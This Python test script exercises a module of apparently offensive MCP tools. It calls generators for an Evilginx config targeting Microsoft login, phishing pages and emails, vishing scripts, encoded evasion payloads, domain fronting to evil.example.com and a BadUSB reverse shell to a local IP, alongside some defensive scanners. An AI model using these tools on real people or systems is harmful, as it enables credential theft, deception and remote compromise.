import sys, json, traceback
sys.path.insert(0, r'C:\Users\mobil\orca\projects\my 1st')

from advanced_mcp_tools import (
    evilginx_generate_config,
    phishing_generate_page,
    evasion_encode_payload,
    evasion_generate_ua,
    evasion_domain_front,
    rfid_analyze_card,
    badusb_generate_payload,
    wifi_deauth_detect,
    ble_parse_advertisement,
    ble_classify_device,
    uart_jtag_reference,
    se_generate_vishing_script,
    se_generate_pretext,
    se_osint_profile,
    se_generate_phishing_email,
    supplychain_dependency_confusion_scan,
    supplychain_typosquat_detect,
    supplychain_cicd_scan,
    supplychain_container_scan,
    swarm_run_assessment,
)

passed = 0
failed = 0

def test(name, fn, *args, **kwargs):
    global passed, failed
    try:
        result = fn(*args, **kwargs)
        if isinstance(result, dict):
            print(f'  Keys: {list(result.keys())}')
        elif isinstance(result, str) and len(result) > 200:
            print(f'  Result (truncated): {result[:200]}...')
        else:
            print(f'  Result: {result}')
        passed += 1
        return result
    except Exception as e:
        print(f'  ERROR: {e}')
        traceback.print_exc()
        failed += 1
        return None

print('=== Advanced MCP Tools Live Test ===')

print('\n[1] Evilginx Config')
test('evilginx', evilginx_generate_config, "login.microsoftonline.com", "phish.example.com")

print('\n[2] Phishing Page')
test('phishing', phishing_generate_page, "microsoft", True, "./test_phish_lab")

print('\n[3] Evasion Base64')
test('b64', evasion_encode_payload, "whoami", "base64")

print('\n[4] Evasion XOR')
test('xor', evasion_encode_payload, "cmd.exe", "xor")

print('\n[5] UA Generator')
test('ua', evasion_generate_ua, "chrome")

print('\n[6] Domain Front')
test('front', evasion_domain_front, "cdn.cloudflare.net", "evil.example.com", "/api")

print('\n[7] RFID')
test('rfid', rfid_analyze_card, "0004", "08", "A1B2C3D4")

print('\n[8] BadUSB Ducky')
test('ducky', badusb_generate_payload, "ducky_reverse_shell", "192.168.1.100", 4444)

print('\n[9] WiFi Deauth')
frames = [{"subtype": 12, "src": "aa:bb:cc:dd:ee:ff", "dst": "ff:ff:ff:ff:ff:ff", "bssid": "aa:bb:cc:dd:ee:ff", "reason": 7} for _ in range(6)]
test('deauth', wifi_deauth_detect, frames)

print('\n[10] BLE Parse')
test('ble', ble_parse_advertisement, "0201060AFF4C000215B9407F30F5F8466EAF657EF64D1004B0010000")

print('\n[11] BLE Classify')
test('ble_class', ble_classify_device, -45, "AirPods")

print('\n[12] UART/JTAG')
test('uart', uart_jtag_reference, "pinouts")

print('\n[13] SE Vishing')
test('vishing', se_generate_vishing_script, "it_support", "John Smith")

print('\n[14] SE Pretext')
test('pretext', se_generate_pretext, "auditor")

print('\n[15] SE OSINT')
test('osint', se_osint_profile, "john.smith@example.com")

print('\n[16] SE Phishing')
test('phish', se_generate_phishing_email, "password_reset", "John Smith", "john@example.com")

print('\n[17] DepConfusion')
test('depcon', supplychain_dependency_confusion_scan, "my-internal-package")

print('\n[18] Typosquat')
test('typo', supplychain_typosquat_detect, "requests")

print('\n[19] CI/CD Scan')
import os
os.makedirs(".github/workflows", exist_ok=True)
with open(".github/workflows/test.yml", "w") as f:
    f.write("name: test\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      - run: npm install\n")
test('cicd', supplychain_cicd_scan, ".github/workflows/test.yml")

print('\n[20] Container Scan')
test('container', supplychain_container_scan, "alpine:latest")

print('\n[21] Swarm')
test('swarm', swarm_run_assessment, ["10.0.0.1"], [22, 80, 443])

print(f'\n=== Results: {passed} passed, {failed} failed ===')
